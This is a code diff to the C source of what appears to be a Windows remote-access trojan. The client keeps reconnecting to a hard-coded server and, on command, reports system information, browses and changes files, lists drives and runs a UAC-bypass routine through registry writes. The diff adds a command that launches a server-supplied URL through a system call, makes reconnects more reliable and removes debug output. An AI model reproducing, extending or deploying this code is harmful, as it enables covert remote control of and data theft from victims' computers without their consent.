@@ -65,6 +65,7 @@
 #define _NEW_FILE "new_file;"
 #define _NEW_FOLDER "new_folder;"
 #define _GET_MAIN_DIRS "get_main_dirs;"
+#define _OPEN_THIS_URL "open_this_url;"
 /* END server recv tags */
 #pragma endregion
 
@@ -94,8 +95,6 @@
 #pragma region declare_functions
 /* START declare functions */
 char* inttostr(int n);
-void showConsole(BOOL);
-void print(const char*);
 void msgBox(const char*, const char*, int);
 char* hostname_to_ip(const char*);
 char** split(const char*, const char*);
@@ -163,10 +162,14 @@ _start:;
 	}
 	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
 	{
+		WSACleanup();
 		goto _start;
 	}
 	char* _IP = hostname_to_ip(HOST);
 	if (_IP == NULL) {
+		WSACleanup();
+		closesocket(s);
+
 		goto _start; 
 	}
 	server.sin_addr.s_addr = inet_addr(_IP);
@@ -177,13 +180,22 @@ _start:;
 	{
 		int err_code = WSAGetLastError();
 		if (err_code == ALREADY_CONNECT) {
+			WSACleanup();
+			closesocket(s);
+
 			goto _start;
 		}
 		else if (err_code == CONNECTION_REFUSED) {
 			Sleep(5000);
+			WSACleanup();
+			closesocket(s);
+
 			goto _start;
 		}
 		else {
+			WSACleanup();
+			closesocket(s);
+
 			goto _start;
 		}
 	}
@@ -192,12 +204,13 @@ _start:;
 		empty_recv = 0;
 	DWORD cht_ThreadID;
 	HANDLE cht_hndl = NULL;
+	int flag = 1;
 	setsockopt(
 			s,
 			IPPROTO_TCP,
 			TCP_NODELAY,
-			(const char*)1,
-			sizeof(BOOL)
+			(const char*)&flag,
+			sizeof(int)
 	);
 #pragma endregion
 
@@ -207,12 +220,18 @@ _start:;
 			srvr_recv = calloc(_2KB, sizeof(char*));
 			if ((recv_size = recv(s, srvr_recv, 2000, 0)) == SOCKET_ERROR)
 			{
+				WSACleanup();
+				closesocket(s);
+
 				goto _start;
 			}
 			if (recv_size == 0) {
 				empty_recv++;
 			}
 			if (empty_recv == 10) {
+				WSACleanup();
+				closesocket(s);
+
 				goto _start;
 			}
 
@@ -253,6 +272,9 @@ _start:;
 				}
 				if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
 				{
+					WSACleanup();
+					closesocket(s);
+
 					goto _start;
 				}
 			}
@@ -266,6 +288,9 @@ _start:;
 				strcat(refresh_message, Active_Window);
 				if (send(s, refresh_message, strlen(refresh_message), 0) < 0)
 				{
+					WSACleanup();
+					closesocket(s);
+
 					goto _start;
 				}
 				free(refresh_message);
@@ -320,6 +345,9 @@ _start:;
 				int len = strlen(tsk_mgr_tag);
 				if (send(s, tsk_mgr_tag, len, 0) < 0)
 				{
+					WSACleanup();
+					closesocket(s);
+
 					goto _start;
 				}
 			}
@@ -395,6 +423,9 @@ _start:;
 					int len = strlen(fil_exp_tag);
 					if (send(s, fil_exp_tag, len, 0) < 0)
 					{
+						WSACleanup();
+						closesocket(s);
+
 						goto _start;
 					}
 				}
@@ -403,6 +434,9 @@ _start:;
 					strcat(info_buffer, "err");
 					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
 					{
+						WSACleanup();
+						closesocket(s);
+
 						goto _start;
 					}
 				}
@@ -447,6 +481,9 @@ _start:;
 					int len = strlen(fil_exp_tag);
 					if (send(s, fil_exp_tag, len, 0) < 0)
 					{
+						WSACleanup();
+						closesocket(s);
+
 						goto _start;
 					}
 				}
@@ -455,6 +492,9 @@ _start:;
 					strcat(info_buffer, "err");
 					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
 					{
+						WSACleanup();
+						closesocket(s);
+
 						goto _start;
 					}
 				}
@@ -499,6 +539,8 @@ _start:;
 					int len = strlen(fil_exp_tag);
 					if (send(s, fil_exp_tag, len, 0) < 0)
 					{
+						WSACleanup();
+						closesocket(s);
 						goto _start;
 					}
 				}
@@ -507,6 +549,8 @@ _start:;
 					strcat(info_buffer, "err");
 					if (send(s, info_buffer, strlen(info_buffer), 0) < 0)
 					{
+						WSACleanup();
+						closesocket(s);
 						goto _start;
 					}
 
@@ -571,6 +615,17 @@ _start:;
 					//TODO: HANDLE ERR
 				}
 			}
+			else if (strstr(srvr_recv, _OPEN_THIS_URL) != NULL) {
+				char** tags = split(srvr_recv, "\n");
+				char* url = tags[1];
+				char* command = calloc(strlen("start ") + strlen(url) + 1, sizeof(char));
+				strcat(command, "start ");
+				strcat(command, url);
+				win_system(command);
+				free(command);
+				free(tags[0]);
+				free(tags);
+			}
 			else if (strstr(srvr_recv, _GET_MAIN_DIRS) != NULL) {
 				char* all_disks = get_all_disks();
 				TCHAR name[UNLEN + 1];
@@ -593,10 +648,12 @@ _start:;
 				strcat(dirs, all_disks);
 				if (send(s, dirs, strlen(dirs), 0) < 0)
 				{
+					WSACleanup();
 					goto _start;
 				}
 				
 			}
+			
 #ifdef UACBYPASS_ENABLE
 			else if (strstr(srvr_recv, "uacbypass;") != NULL)
 			{
@@ -614,14 +671,6 @@ _start:;
 #pragma endregion
 	
 	return EXIT_SUCCESS;//! IT SHOULD NOT EXIT !!
-}
-
-void showConsole(BOOL mod) {
-	HWND Stealth;
-	if (AllocConsole()) {
-		Stealth = FindWindowA("ConsoleWindowClass", NULL);
-		ShowWindow(Stealth, mod);
-	}
 }
 
 
@@ -813,12 +862,7 @@ BOOL delete_folder(WCHAR * Wfolder) {
 	}
 	return FALSE;
 }
-#ifdef _DEBUG
-void print(const char* buffer) {
-	HANDLE __HSTDOUT = GetStdHandle(STD_OUTPUT_HANDLE);
-	WriteConsoleA(__HSTDOUT, buffer, (UINT)strlen(buffer), (UINT*)0, NULL);
-}
-#endif
+
 
 char** split(const char* str, const char* delim) {
 	char* s = _strdup(str);
@@ -1082,7 +1126,6 @@ _Bool UACPASSING(char* exepath) {
 _UACBYPASS:;
 	if ((lResult = RegOpenKeyExA(HKEY_CURRENT_USER, $, 0, KEY_SET_VALUE, &hKey)) == ERROR_SUCCESS) {
 		closekey = TRUE;
-		//printf("[+] Done Open REG\n");
 	}
 	else {
 		if (lResult == ERROR_FILE_NOT_FOUND) {
@@ -1090,12 +1133,13 @@ _UACBYPASS:;
 				goto _UACBYPASS;
 			}
 			else {
-				printf("Error while opening REG Exiting | RegCreateKeyA | %d", lResult);
+				return FALSE;
 
 			}
 		}
 		else {
-			printf("Error while opening REG Exiting | RegOpenKeyExA | %d", lResult);
+			return FALSE;
+
 		}
 		return FALSE;
 	}
